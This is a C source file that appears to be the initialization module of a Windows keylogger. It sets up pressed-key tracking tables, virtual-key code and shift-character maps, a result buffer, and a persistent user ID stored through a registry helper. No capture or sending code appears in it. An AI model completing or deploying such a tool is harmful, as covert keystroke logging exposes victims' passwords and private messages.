#include "utils/initializer.h"
#include "regedit/regedit.h"


BOOL initStrings(char** resultOut, char** userIdOut) {
    char* result = malloc(3000);
    if (result == NULL) {
        return FALSE;
    }
    strcpy(result, "");

    char* userId = malloc(37);
    if (userId == NULL) {
        return FALSE;
    }

    LPBYTE tempUserId = getOrCreateAndGetUserId();
    wcstombs(userId, (wchar_t*)tempUserId, 37);

    *resultOut = result;
    *userIdOut = userId;

    return TRUE;
}

BOOL initAppContext(AppContext* ctx) {
    ctx->combinations = createCombinationTable();
    if (!ctx->combinations) return FALSE;

    ctx->pressedKeys = createTablePK();
    if (!ctx->pressedKeys) return FALSE;

    ctx->keys = createTable();
    if (!ctx->keys) return FALSE;

    ctx->set = createSet();
    if (!ctx->set) return FALSE;

    initKeysCombinations(ctx->combinations);
    initKeys(ctx->keys);

    return TRUE;
}

void destroyAppContext(AppContext* ctx) {
    if (ctx->combinations) {
        freeCombinations(ctx->combinations);
        ctx->combinations = NULL;
    }
    if (ctx->pressedKeys) {
        freeTablePK(ctx->pressedKeys);
        ctx->pressedKeys = NULL;
    }
    if (ctx->keys) {
        freeTable(ctx->keys);
        ctx->keys = NULL;
    }
    if (ctx->set) {
        freeSet(ctx->set);
        ctx->set = NULL;
    }
}

void initKeysCombinations(KeysCombinations *table) {
    insertCombination(table, "`", '~');
    insertCombination(table, "0", ')');
    insertCombination(table, "1", '!');
    insertCombination(table, "2", '@');
    insertCombination(table, "3", '#');
    insertCombination(table, "4", '$');
    insertCombination(table, "5", '%');
    insertCombination(table, "6", '^');
    insertCombination(table, "7", '&');
    insertCombination(table, "8", '*');
    insertCombination(table, "9", '(');
    insertCombination(table, "-", '_');
    insertCombination(table, "=", '+');
    insertCombination(table, "[", '{');
    insertCombination(table, "]", '}');
    insertCombination(table, "\\", '|');
    insertCombination(table, ";", ':');
    insertCombination(table, "'", '\'');
    insertCombination(table, ",", '<');
    insertCombination(table, ".", '>');
    insertCombination(table, "/", '?');
}

void initKeys(Keys *table) {
    insert(table, "0", 0x30);
    insert(table, "1", 0x31);
    insert(table, "2", 0x32);
    insert(table, "3", 0x33);
    insert(table, "4", 0x34);
    insert(table, "5", 0x35);
    insert(table, "6", 0x36);
    insert(table, "7", 0x37);
    insert(table, "8", 0x38);
    insert(table, "9", 0x39);
    insert(table, "A", 0x41);
    insert(table, "B", 0x42);
    insert(table, "C", 0x43);
    insert(table, "D", 0x44);
    insert(table, "E", 0x45);
    insert(table, "F", 0x46);
    insert(table, "G", 0x47);
    insert(table, "H", 0x48);
    insert(table, "I", 0x49);
    insert(table, "J", 0x4A);
    insert(table, "K", 0x4B);
    insert(table, "L", 0x4C);
    insert(table, "M", 0x4D);
    insert(table, "N", 0x4E);
    insert(table, "O", 0x4F);
    insert(table, "P", 0x50);
    insert(table, "Q", 0x51);
    insert(table, "R", 0x52);
    insert(table, "S", 0x53);
    insert(table, "T", 0x54);
    insert(table, "U", 0x55);
    insert(table, "V", 0x56);
    insert(table, "W", 0x57);
    insert(table, "X", 0x58);
    insert(table, "Y", 0x59);
    insert(table, "Z", 0x5A);
    insert(table, "-", 0xBD);
    insert(table, "=", 0xBB);
    insert(table, "[", 0xDB);
    insert(table, "]", 0xDD);
    insert(table, "\\", 0xDC);
    insert(table, ";", 0xBA);
    insert(table, "'", 0xDE);
    insert(table, ",", 0xBC);   
    insert(table, ".", 0xBE);
    insert(table, "/", 0xBF);
    insert(table, "ENTER", 0x0D);
    insert(table, "SPACE", 0x20);
    insert(table, "CAPS_LOCK", 0x14);
    insert(table, "NUM_LOCK", 0x90);
    insert(table, "BACK_SPACE", 0x08);
    insert(table, "NUMPAD0", 0x60);
    insert(table, "NUMPAD1", 0x61);
    insert(table, "NUMPAD2", 0x62);
    insert(table, "NUMPAD3", 0x63);
    insert(table, "NUMPAD4", 0x64);
    insert(table, "NUMPAD5", 0x65);
    insert(table, "NUMPAD6", 0x66);
    insert(table, "NUMPAD7", 0x67);
    insert(table, "NUMPAD8", 0x68);
    insert(table, "NUMPAD9", 0x69);
    insert(table, "MULTIPLY", 0x6A);
    insert(table, "ADD", 0x6B);
    insert(table, "SEPARATOR", 0x6C);
    insert(table, "SUBTRACT", 0x6D);
    insert(table, "DECIMAL", 0x6E);
    insert(table, "DIVIDE", 0x6F);
    insert(table, "LEFT_ARROW", 0x25);
    insert(table, "UP_ARROW", 0x26);
    insert(table, "RIGHT_ARROW", 0x27);
    insert(table, "DOWN_ARROW", 0x28);
}
